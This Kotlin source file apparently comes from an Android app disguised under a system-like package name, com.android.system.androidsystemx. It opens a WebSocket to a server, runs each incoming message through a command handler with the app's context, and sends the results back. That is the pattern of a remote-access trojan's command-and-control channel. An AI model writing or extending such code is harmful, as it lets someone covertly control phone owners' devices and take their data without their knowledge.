package com.android.system.androidsystemx

import android.content.Context
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener

class Websocket {
    fun connectToWebsocket(serverUrl:String,context:Context){
        val client = OkHttpClient()
        val request = Request.Builder().url(serverUrl).build()



        val listener = object:WebSocketListener(){
            lateinit var webSocket: WebSocket //socket

            //on connect
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d("check1","connected")
                this.webSocket = webSocket
                SaveLocalData().saveIsConnected(context,"1")
            }

            //on message
            @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.d("check1",text.split("|")[0])
                SaveLocalData().saveIsConnected(context,"1")
                val data = text.split("|")[0]
                val to = text.split("|")[1]
                val finalResponse = ManageCommand().manageMessage(context, data,to,text)
                sendMessage(finalResponse)
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                SaveLocalData().saveIsConnected(context,"0")
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                // Handle connection closed event
                SaveLocalData().saveIsConnected(context,"0")
            }

            // Function to send a message
            private fun sendMessage(message: String) {
                webSocket.send(message)
            }

        }

        client.newWebSocket(request,listener)
    }
}
